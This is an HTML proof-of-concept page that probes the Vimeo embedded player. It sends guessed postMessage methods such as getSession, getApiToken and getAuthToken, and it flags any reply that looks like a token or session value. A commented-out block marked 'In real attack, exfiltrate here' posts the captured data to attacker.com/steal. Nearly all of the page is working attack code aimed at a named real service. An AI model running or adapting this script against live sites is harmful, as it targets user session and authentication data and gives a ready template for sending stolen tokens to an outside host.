<!DOCTYPE html>
<html>
<head>
    <title>Vimeo PostMessage Exploit PoC</title>
    <style>
        body { font-family: monospace; padding: 20px; }
        #results { background: #f0f0f0; padding: 10px; margin: 10px 0; }
        .critical { background: #ffcccc; border: 2px solid red; }
        iframe { border: 1px solid #ccc; }
    </style>
</head>
<body>
    <h1>ðŸ”´ Vimeo PostMessage Vulnerability PoC</h1>
    <p>Testing postMessage origin validation bypass...</p>
    
    <iframe id="vimeo" 
            src="https://player.vimeo.com/video/935884964?background=1"
            width="640" 
            height="360">
    </iframe>

    <h2>Results:</h2>
    <div id="results"></div>

    <script>
        const iframe = document.getElementById('vimeo');
        const results = document.getElementById('results');
        let messageCount = 0;

        function log(message, data, critical = false) {
            const div = document.createElement('div');
            div.className = critical ? 'critical' : '';
            div.innerHTML = `
                <strong>${new Date().toISOString()}</strong><br>
                ${message}<br>
                <pre>${JSON.stringify(data, null, 2)}</pre>
                <hr>
            `;
            results.insertBefore(div, results.firstChild);
        }

        // Listen for responses
        window.addEventListener('message', function(event) {
            messageCount++;
            
            console.log('ðŸ“¨ Message #' + messageCount);
            console.log('Origin:', event.origin);
            console.log('Data:', event.data);
            
            // Check if it's from Vimeo
            if (event.origin === 'https://player.vimeo.com') {
                const dataStr = JSON.stringify(event.data);
                
                // Check for sensitive data
                const isCritical = dataStr.match(/token|jwt|eyJ|session|api_key|auth/i);
                
                log(
                    `Response from Vimeo (Message #${messageCount})`,
                    event.data,
                    isCritical
                );
                
                if (isCritical) {
                    console.error('ðŸš¨ CRITICAL: Sensitive data exposed!');
                    console.log(event.data);
                    
                    // In real attack, exfiltrate here
                    // fetch('https://attacker.com/steal', {
                    //     method: 'POST',
                    //     body: JSON.stringify(event.data)
                    // });
                }
            }
        });

        // Wait for iframe to load
        setTimeout(() => {
            console.log('ðŸš€ Starting attack...');
            log('Attack started - sending test messages...', {});
            
            // Test methods from Vimeo Player API
            const testMethods = [
                // Standard API methods
                { method: 'getDuration', desc: 'Get video duration' },
                { method: 'getCurrentTime', desc: 'Get current playback time' },
                { method: 'getVideoId', desc: 'Get video ID' },
                { method: 'getVideoTitle', desc: 'Get video title' },
                { method: 'getVideoUrl', desc: 'Get video URL' },
                { method: 'getVolume', desc: 'Get volume' },
                
                // Try to get config/state
                { method: 'getConfig', desc: 'âš ï¸ Try to get config' },
                { method: 'getState', desc: 'âš ï¸ Try to get state' },
                { method: 'getPlayerState', desc: 'âš ï¸ Try to get player state' },
                
                // Try variations
                { method: 'config', desc: 'âš ï¸ Direct config access' },
                { method: 'playerConfig', desc: 'âš ï¸ PlayerConfig access' },
                { method: '_config', desc: 'âš ï¸ Private config' },
                
                // Try to access user data
                { method: 'getUserData', desc: 'ðŸš¨ Try to get user data' },
                { method: 'getUser', desc: 'ðŸš¨ Try to get user' },
                { method: 'getSession', desc: 'ðŸš¨ Try to get session' },
                { method: 'getApiToken', desc: 'ðŸš¨ Try to get API token' },
                { method: 'getAuthToken', desc: 'ðŸš¨ Try to get auth token' },
                
                // Other interesting methods
                { method: 'getChapters', desc: 'Get chapters' },
                { method: 'getTextTracks', desc: 'Get text tracks' },
                { method: 'getQualities', desc: 'Get quality levels' },
                { method: 'getColor', desc: 'Get player color' },
            ];

            testMethods.forEach((test, index) => {
                setTimeout(() => {
                    console.log(`Sending: ${test.method} - ${test.desc}`);
                    
                    iframe.contentWindow.postMessage({
                        method: test.method,
                        value: null,
                        id: index
                    }, '*');  // Sending to any origin
                    
                }, index * 200);
            });

            // Summary after all tests
            setTimeout(() => {
                log('All tests completed', {
                    totalMessages: messageCount,
                    note: 'Check console for details'
                });
            }, testMethods.length * 200 + 1000);

        }, 3000); // Wait 3 seconds for iframe to fully load
    </script>
</body>
</html>
